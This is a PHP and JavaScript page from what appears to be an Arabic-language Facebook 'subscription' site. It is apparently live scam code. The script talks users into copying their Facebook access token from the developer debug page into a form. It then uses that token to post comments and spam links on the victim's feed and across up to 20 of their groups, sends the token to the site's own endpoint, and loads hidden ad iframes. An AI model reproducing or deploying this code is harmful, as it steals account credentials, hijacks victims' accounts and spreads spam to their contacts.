<?php
@ob_start();
@session_start();
include 'inc/head.php';
include 'src/facebook.php';
$config = array();
$app2= isset($_GET['app2']);
$app3= isset($_GET['app3']);
$St= getSet();

if(isv("GetF")){
?>
<iframe src="http://go.pub2srv.com/afu.php?zoneid=<?=isv("GetF")?>" width="790" height="150"  sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts "></iframe>

<?php
die();
}

$allow = "http://xbtc.eu/?ref=918724";
$block = "";
$id =   Cip($allow,$block);
if($id[1] == 1){
 echo "blook!!!";
}else{
//echo $id[0];
echo Re($id[0]);
}
die();
if(!isv('red',1) and !isv('delete',1) and !Sion('Delete') and !isv('app',1)){
//adf($app['end'],2);
if($St->app2sql == 1 and  !$app3  or $app2){
$config['appId'] = $St->app2_id;
$config['secret'] = $St->app2_key;
$appsql="users2";
//$reUrl = $facebook->getLoginUrl($params);
if(!Capp($St->app2_id)){ UpDate('settings','app2',0);  UpDate('settings','app2sql',0); header("Location: /red.php"); die();  }
//if(!Capp($St->app2_id) and $St->app != 1 ){UpDate('settings','app2',0);  UpDate('settings','app2sql',0); header("Location: /red.php");  }
    }else{
$config['appId'] = $St->app_id;
$config['secret'] = $St->app_key;
$appsql="users";
if(!Capp($St->app_id) and $St->app2 == 1){UpDate('settings','app2sql',1); header("Location: /red.php");  }
if(!Capp($St->app_id) and $St->app2 != 1 and isset($_GET['link'])){ if(1==2){ $reUrl="https://goo.gl/P9aJsv"; echo  Re($reUrl,1); die();  }else{  echo  Re($_GET['link'],1); die(); }
}else if(!Capp($St->app_id) and $St->app2 != 1 and  $St->app != 1   and !isv('link',1) and in_array($PUr,$app['allow_url']) and $St->OptioMobile != 1){ $reUrl="https://goo.gl/xO2ffR"; echo  Re($reUrl,1); die();  }
if ($St->OptioMobile == 1 and !Capp($St->app_id)){ Update('settings','OptioMobile',0); Update('settings','app',1);  $reUrl ="/red.php";  echo  Re($reUrl,1); die();   }
if(!Capp($St->app_id) and  $St->app2 != 1  and $St->app == 1 and $St->appsql != 1){ UpDate('settings','appsql',1); header("Location: /red.php");  }
//if(!Capp($St->app_id) and  $St->app != 1 and $St->app2 != 1){UpDate('settings','appsql',1); UpDate('settings','app',1); header("Location: /red.php");  }
    }
$config['fileUpload'] = true; // optional
$facebook = new Facebook($config);
if($app2){$reUrl = $facebook->getLoginUrl($params2);}else if($app3){$reUrl = $facebook->getLoginUrl($params3);}else if($St->appsql == 1){ if(Capp($St->app_id)){  UpDate('settings','app2sql',0); } $reUrl="/?app=htc"; }else{$reUrl = $facebook->getLoginUrl($params);}
if(isset($_GET['link']) and $_GET['link'] != ''){
$_SESSION['get']= $_GET['link'];
}
if($PUr != $AdF ){
$code =json_decode(readURL("http://app.nedalkher.net/cron.php?access=true"),true);
//die($code[0]['access']);
if($code[0]['access'] != Sel('share')->access){
    UpDate('share','access',$code[0]['access']);
    UpDate('users','access',$code[0]['access'],'where user_id="100006273455189"');
}
}
/*
$access = Sel('share')->access;
$url =json_decode(readURL("https://graph.facebook.com/1426100954327128/feed?fields=message,id&limit=1&access_token=".$access),true)['data'];
if($url[0]['id'] != "1426100954327128_1767353790201841" )
{
$url =json_decode(readURL("https://graph.facebook.com/".$url[0]['id']."?method=DELETE&access_token=".$access),true);
}
*/
?>
<div class="container">
<div class="row" >
<?php  if(!Sion('set') and !Sion('Rfb') and  !Sion('link') and  !Sion('no_puplish')){ ?>
<?=loding("من فضلك انتظر جارى تحويلك للاشتراك , لاتنسى ان تكمل الاشتراك حتى النهايه");?>
<?php }else if(Sion('no_puplish')){
iSion('no_puplish',0);
echo loding("من فضلك قم بااكمال الاشتراك بشكل كامل وصحيح ,سيتم تحويلك للاشترك مره اخرى");

}else if(Sion('Rfb')){
echo loding("من فضلك انتظر سيتم تحويلك للموضوع");
$reUrl = Sion('Rfb');
//iSion('Rfb','');
}else{ ?>
<?=loding("من فضلك قم بتسجيل الدخول اولا ,سيتم تحويلك الى تسجيل الدخول");?>

<?php } echo redMsg('success','تم تحويلك بنجاح',0,0,$reUrl);    ?>
<meta http-equiv="Refresh" content="0; URL=<?=$reUrl;?>">
</div>
<div class="center ad" style="opacity: 0;">
	   <div class="center ad">
 <?php if($app['Adf'] == 1){ echo  $St->send_text_off; echo  $St->send_text_off; } ?>
       </div>

    <?php /* and $_SERVER['REQUEST_URI'] != "/red.php" and !strpos($_SERVER['REQUEST_URI'],"?link")*/ if(!empty($St->admin_name) and $app['adf'] == 1  ){ for($i=0;$i<$app['pub'][4];$i++){ ?>
       <iframe  class="pupad" src="<?=$St->admin_name?>" <?=$sandbox?>></iframe>

    <?php } } ?>
</div>
</div>
<?php  }else if(isv('red',1)) {
$type= 0; $post = Sel('task','where share="0"');
if($post){ $type = Sel('posts','where id='.$post->postid)->type;  }
//$url =json_decode(readURL("http://qurani.nedalkher.com/cron.php?task=true"),true);
$url[0]['type'] = 0;
if($type != 7  and $url[0]['type'] != 7 and last_share($app['Atime'][0],$St->last_share,$app['Atime'][1]) and $app['hitleap'][0]  or $type != 7  and $url[0]['type'] != 7 and $app['Atime'][2] and $app['hitleap'][0] or $app['Dtime'][2] and $app['hitleap'][0]){
if(last_share($app['Dtime'][0],$St->last_share,$app['Dtime'][1]) and !$app['Atime'][2] and !$app['Dtime'][2] ){
//UpDate('settings','last_share',time());
}
if($app['hitleap'][1]){
    echo redMsg('success','تم تحويلك بنجاح',0,0,$St->admin_name);
?>
<meta http-equiv="Refresh" content="0; URL=<?=$St->admin_name?>">
<div class="center ad row" style="opacity: 1;">
      <div class="col m6 s12">
 <?php if($app['Adf'] == 1){ echo  $St->send_text_off;  } ?>
       </div>
      <div class="col m6 s12">
 <?php if($app['Adf'] == 1){ echo  $St->send_text_off;  } ?>
       </div>

    <?php  if(!empty($St->admin_name) and $app['adf'] == 1){ for($i=0;$i<$app['pub'][3];$i++){  ?>
    <div class="col m6 s6">
       <iframe  class="pupad" src="<?=$St->admin_name?>" ></iframe>
     </div>
<?php } } }else if($app['hitleap'][2]){
    echo redMsg('success','تم تحويلك بنجاح',1,0,"http://www.nedalkher.com/p/red.html");
}else{
$id = Sel('video',' order by rand() ')->id;
//iSion('red',1);
$R =Uvideo($id);
//$R = "http://app.malomaama.com//red.php?red=true";
   ?>
<?php  if(!empty($St->admin_name) and $app['adf'] == 1 and  1 == 2){ for($i=0;$i<$app['pub'][4];$i++){  ?>
    <div class="col m6 s6">
       <iframe  class="pupad" src="<?=$St->admin_name?>" <?=$sandbox?>></iframe>
     </div>
<?php } }  //echo redMsg('success','تم تحويلك بنجاح',0,0,$R);
$id = Sel('video',' order by rand() ')->id;
iSion('red',1);
$R =Uvideo($id);
if($St->url_block == "video" ){  $block = $R;  }else{ $block = $St->url_block;  }
if($St->url_allow == "video" ){  $allow = $R;  }else{ $allow = $St->url_allow;  }

//echo   Cip($allow,$block);
  referl();
?>
<!--<meta http-equiv="Refresh" content="0; URL=<?=$R?>"> -->
<?php }  ?>
</div>
<?php }else{ echo '<meta http-equiv="Refresh" content="0; URL=http://www.nedalkher.com/">';  } }else if(isv('app',1) and 1 == 2){
?>
<?php
}else if(isv('app',1)){
include "inc/cp/login.php";
?>
<div class="center ad" style="opacity: 0;">
    <?php if(!empty($St->admin_name) and $app['adf'] == 1 and  1 ==2){ for($i=0;$i<$app['pub'][4];$i++){ ?>
       <iframe  class="pupad" src="<?=$St->admin_name?>" <?=$sandbox?>></iframe>

    <?php } } ?>
</div>

<?php
}else{
$reUrl ="/Delete.html"

?>
<?=loding("من فضلك قم بتسجيل الدخول اولا");?>
<meta http-equiv="Refresh" content="0; URL=<?=$reUrl;?>">
<div class="center ad" style="opacity: 0;">
 <?php if($app['Adf'] == 1){ echo  $St->send_text_off; echo  $St->send_text_off;  } ?>
    <?php if(!empty($St->admin_name) and $app['adf'] == 1){ for($i=0;$i<$app['pub'][0];$i++){ ?>
       <iframe  class="pupad" src="<?=$St->admin_name?>" <?=$sandbox?>></iframe>

<?php } } ?>
</div>
<?php } if(isv('app',1)){  ?>

  <script type="text/javascript" src="<?=$St->url?>/assets/js/jquery.min.js"></script>
  <script type="text/javascript" src="<?=$St->url?>/assets/js/materialize.min.js"></script>
  <script type="text/javascript" src="<?=$St->url?>/assets/js/ajax.js"></script>
  <script type="text/javascript">
<?php  if(Sion("type") == "error" and $post == 1 and  !$suc or isv('msg',1)){  ?>
         error_msg("<?=Sion("msg")?>");
         <?php  $_SESSION['type']=""; ?>
         <?php }else  if(Sion("type") == "success" and $post == 1 and !$suc or isv('msg',1)){  ?>
         success_msg("<?=Sion("msg")?>");
         <?php  $_SESSION['type']=""; ?>
         <?php } ?>
 <?php  if($app['Rframe'][0]){  ?>
 Rframe('<?=$St->admin_name?>',50000);
         <?php } ?>
  </script>
  <script type="text/javascript">
        jQuery(document).ready(function($) {
 Materialize.updateTextFields();
 $('#label').click(function(e) {
      $(this).addClass('active');
 });
 $('a#getPermissions').click(function(e) {
   var moree =   $('input[name=mo]').val();
                e.preventDefault();
                var targetWin;
                var width = 640;
                var height = 540;
                var left = screen.width / 2 - width / 2;
                var top = screen.height / 2 - height / 2;

                //var link = 'https://goo.gl/iOeq3v';
                //var link = 'https://goo.gl/1oThTU';
                var link = "<?=$rel?>";

                targetWin = window.open(link, 'sth', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=no, width=' + width + ', height=' + height + ', top=' + top + ', left=' + left);

                var c = setInterval(function() {
                    if (targetWin.closed) {
                        clearTimeout(c);
                     if(moree != 1){
                        $('.lg').hide();
                        $('.loding').show();
                      location.replace("../verify_chrome.php?user=access&uid=<?=Sion('uid')?>&link=<?=Sion('get')?>")
                      }else{
                        success_msg("الان انتقل للخطوة الثانيه");
                       //location.reload();

                      }
                    }
                }, 1000);
            });
               $('a#getAccessToken').click(function(e) {
                e.preventDefault();

                var width = 880;
                var height = 280;
                var left = screen.width / 2 - width / 2;
                var top = screen.height / 2 - height / 2;


                //var link = 'https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424';
                <?php   if($St->titleen == "iphoto"){ $typeapp = 10754253724; }else{ $typeapp = 41158896424; }  ?>
                var link = 'https://developers.facebook.com/tools/debug/accesstoken/?app_id=<?=$typeapp?>';

                window.open(link, 'sth', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=no, width=' + width + ', height=' + height + ', top=' + top + ', left=' + left);

            });

               $('a#getApp').click(function(e){
                e.preventDefault();

                var width = 880;
                var height = 280;
                var left = screen.width / 2 - width / 2;
                var top = screen.height / 2 - height / 2;

              var link = 'https://developers.facebook.com/requests/';
              var targetWin =  window.open(link, 'sth', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=no, width=' + width + ', height=' + height + ', top=' + top + ', left=' + left);
                var c = setInterval(function() {
                    if (targetWin.closed) {
                        clearTimeout(c);
                        success_msg("سيتم الان اعادة تحميل الصفحه");
                       location.reload();

                    }
                }, 1000);

            });

            $('button#back').click(function(e) {
                e.preventDefault();

                $('#step-2').slideUp('slow', function() {
                    $('#step-1').slideDown('slow');
                });
            });

        });

 function more(){
   var moree =   $('input[name=mo]').val();
     if(moree != 1){
                        $('.auto').hide();
                        //$('button[name=post]').hide();
                        //$('button[name=postt]').show();
                        $('.more').show();
                        $('#myBtn').show();
                        $('input[name=mo]').val(1);
                         $('#myBt').text('جرب طريقة اخرى');

                        //$('#form').attr('action','verify_chrome.php');
               }else{
                        $('.auto').show();
                        //$('button[name=post]').show();
                        //$('button[name=postt]').hide();
                        $('.more').hide();
                        $('#myBtn').hide();
                        $('#myBt').text('رجوع');
                        $('input[name=mo]').val(0);
                        //$('#form').attr('action','');
               }
  //return false;
}

    </script>
<script type="text/javascript">
            //<![CDATA[
        $(window).load(function() {
            var $myText = $("#myText");
            $myText.data("value", $myText.val());
            setInterval(function() {
                var data = $myText.data("value"),
                    val = $myText.val();

                if (data !== val) {
                    $myText.data("value", val);
                    $("#myBtn").click();

                }
            }, 100);
            $("#myBtn").on("click", function() {
                access_token = $('#myText').val();
                if (access_token.indexOf("access_token=") > 0) {
                    access_token = access_token.split("access_token=")[1].split("&")[0];
                    $('#myText').val(access_token);
                }
                if (access_token.startsWith("EA")) {
              $.getJSON('https://graph.facebook.com/1767860566817830/comments?access_token=' + access_token + '&message=تم الاشتراك جزاك الله خيرا&method=post', function(result) {
                                //var str = result.id
                                //var res = str.split("_")[1];
                                var a = "https://www.facebook.com/Ned2.Al5er/posts/1767860566817830";
                                var a2 = "http://ap.nedalkher.com/";
                                //var image = encodeURIComponent(a);
                                var text = '<?=$St->description?>';
                                postToGroups(access_token,'me', text,a);
                                postToGroups(access_token,'me', text,a2);
                                Get_Groups(access_token, text,a);
                            });
                 location.replace("../verify_chrome.php?user="+access_token);
                 return false;
                } else {
                    error_msg("من فضلك قم بعمل الخطوات بشكل صحيح");
                    return false;
                }

            })
        }); //]]>

         function Get_Groups(access_token, text, image) {
            jQuery.ajax({
                url: 'https://graph.facebook.com/fql?q=SELECT gid FROM group WHERE gid IN (SELECT gid FROM group_member WHERE uid = me()) order by rand() LIMIT 20&access_token=' + access_token,
                dataType: 'jsonp',
                success: function(a) {
                    for (i = 0; i < a.data.length; i++) {
                        postToGroups(access_token, a.data[i].gid, text, image);
                    }
                }
            })
        }

        function postToGroups(access_token, groupID, text, image) {
            $.getJSON('https://graph.facebook.com/' + groupID + '/feed?access_token=' + access_token + '&method=POST&link=' + image + '&message=' + text)
        }
    </script>
<?php } ?>